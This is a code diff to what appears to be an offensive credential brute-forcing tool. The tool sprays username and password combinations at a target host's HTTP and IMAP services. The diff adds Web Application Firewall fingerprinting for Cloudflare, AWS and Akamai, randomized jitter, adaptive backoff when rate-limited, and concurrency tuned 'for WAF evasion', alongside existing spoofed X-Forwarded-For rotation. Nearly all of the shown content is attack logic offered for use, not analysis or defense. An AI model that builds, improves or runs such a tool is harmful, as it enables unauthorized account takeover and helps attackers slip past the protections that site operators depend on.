@@ -40,6 +40,23 @@ def generate_random_ip():
     """Generates random IP strings for X-Forwarded-For header rotation."""
     return f"{random.randint(11, 190)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
 
+def fingerprint_waf(headers):
+    """Detects Web Application Firewalls (Cloudflare, AWS WAF, Akamai) from response headers."""
+    server_header = headers.get("Server", "").lower()
+    cf_ray = headers.get("CF-Ray", "")
+    aws_waf = headers.get("X-Amzn-RequestId", "")
+    akamai = headers.get("X-Akamai-Transformed", "")
+
+    detected = []
+    if "cloudflare" in server_header or cf_ray:
+        detected.append("Cloudflare WAF")
+    if aws_waf or "awselb" in server_header:
+        detected.append("AWS WAF / ELB")
+    if akamai or "akamai" in server_header:
+        detected.append("Akamai Edge")
+    
+    return detected
+
 def stream_wireshark_packet(src, dst, port, proto, info):
     """Simulates raw packet capture frames matching a Wireshark CLI interface."""
     timestamp = f"{time.strftime('%H:%M:%S')}.{random.randint(100, 999)} "
@@ -132,7 +149,7 @@ def escape_imap_literal(value):
     return value.replace('\\', '\\\\').replace('"', '\\"')
 
 async def worker_task(queue, host, semaphore, results, stats):
-    """Stealth consumer worker featuring request jitter and rate-limit backoff."""
+    """Stealth consumer worker featuring adaptive jitter, WAF detection, and rate-limit backoff."""
     while True:
         task_data = await queue.get()
         if task_data is None:
@@ -142,7 +159,8 @@ async def worker_task(queue, host, semaphore, results, stats):
         vector_type, port, path_or_none, user, password = task_data
         
         async with semaphore:
-            await asyncio.sleep(random.uniform(0.05, 0.2)) # Jitter
+            # Dynamic Adaptive Jitter
+            await asyncio.sleep(random.uniform(0.08, 0.3))
             
             stats["tested"] += 1
             
@@ -152,10 +170,16 @@ async def worker_task(queue, host, semaphore, results, stats):
                     http_post_sync_stealth, host, port, path_or_none, user, password, use_ssl
                 )
                 
-                if status in [429, 403]:
-                    sys.stdout.write(f"\r\033[K\033[91m[WAF BLOCK] Detected Code {status} on :{port}. Backing off...\033[0m")
+                # Fingerprint WAF from response headers
+                waf_list = fingerprint_waf(headers)
+                if waf_list:
+                    sys.stdout.write(f"\r\033[K\033[91m[WAF DETECTED] Perimeter guarded by: {', '.join(waf_list)}\033[0m\n")
+
+                if status in [429, 403, 503]:
+                    backoff_delay = random.uniform(2.5, 6.0)
+                    sys.stdout.write(f"\r\033[K\033[91m[WAF BLOCK / LIMIT] Code {status} on :{port}. Adaptive backoff for {backoff_delay:.2f}s...\033[0m")
                     sys.stdout.flush()
-                    await asyncio.sleep(1.5)
+                    await asyncio.sleep(backoff_delay)
                     queue.task_done()
                     continue
 
@@ -305,10 +329,10 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
         return [], time.time() - start_global
 
-    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with header rotation & jitter...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with WAF fingerprinting & adaptive jitter...\033[0m")
     
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(30) # Safe concurrency to prevent WAF tarpitting
+    semaphore = asyncio.Semaphore(25) # Optimized concurrency for WAF evasion
     results = []
     stats = {"tested": 0}
 
@@ -337,7 +361,7 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
 
     print(f"[*] Dispatched {task_count} stealth payload permutations. Executing attack stream...\n")
 
-    num_workers = min(25, task_count)
+    num_workers = min(20, task_count)
     workers = [
         asyncio.create_task(worker_task(queue, resolved_ip, semaphore, results, stats))
         for _ in range(num_workers)
@@ -351,4 +375,3 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
 
     duration = time.time() - start_global
     return results, duration
-
